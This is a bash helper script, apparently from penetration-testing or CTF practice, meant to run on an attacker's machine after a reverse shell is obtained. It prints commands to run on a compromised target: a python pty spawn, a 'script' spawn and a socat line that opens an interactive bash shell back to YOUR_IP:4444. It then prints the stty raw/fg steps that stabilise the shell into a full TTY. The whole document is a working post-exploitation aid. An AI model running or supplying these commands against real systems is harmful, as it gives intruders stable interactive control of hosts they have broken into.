#!/bin/bash
# TTY Upgrade Helper Script
# Run this on your attacker machine after getting a reverse shell
# Then follow the prompts to upgrade to full TTY

set -e

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

echo -e "${GREEN}=== Reverse Shell TTY Upgrade Helper ===${NC}"
echo -e "${YELLOW}Instructions:${NC}"
echo "1. Run one of the spawn commands on your target (see below)"
echo "2. Press Ctrl+Z in this terminal to background the connection"
echo "3. Run the commands shown below"
echo "4. Press 'fg' to return to your shell"
echo ""

# Get terminal dimensions
ROWS=$(tput lines)
COLS=$(tput cols)

echo -e "${GREEN}Your terminal size: ${ROWS}x${COLS}${NC}"
echo ""

echo -e "${YELLOW}=== Spawn Commands (run on target) ===${NC}"
echo ""
echo -e "${GREEN}Python method:${NC}"
echo "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'"
echo ""
echo -e "${GREEN}Script method:${NC}"
echo "script /dev/null -qc /bin/bash"
echo ""
echo -e "${GREEN}Socat method (best quality):${NC}"
echo "socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:YOUR_IP:4444"
echo ""
echo -e "${YELLOW}=== After spawning, run these commands ===${NC}"
echo "(Press Ctrl+Z first, then:)"
echo ""
echo "stty raw -echo"
echo "fg"
echo "export SHELL=/bin/bash"
echo "export TERM=screen"
echo "stty rows ${ROWS} columns ${COLS}"
echo "reset"
echo ""
echo -e "${GREEN}=== Done ===${NC}"
echo "Your shell should now have full TTY functionality!"
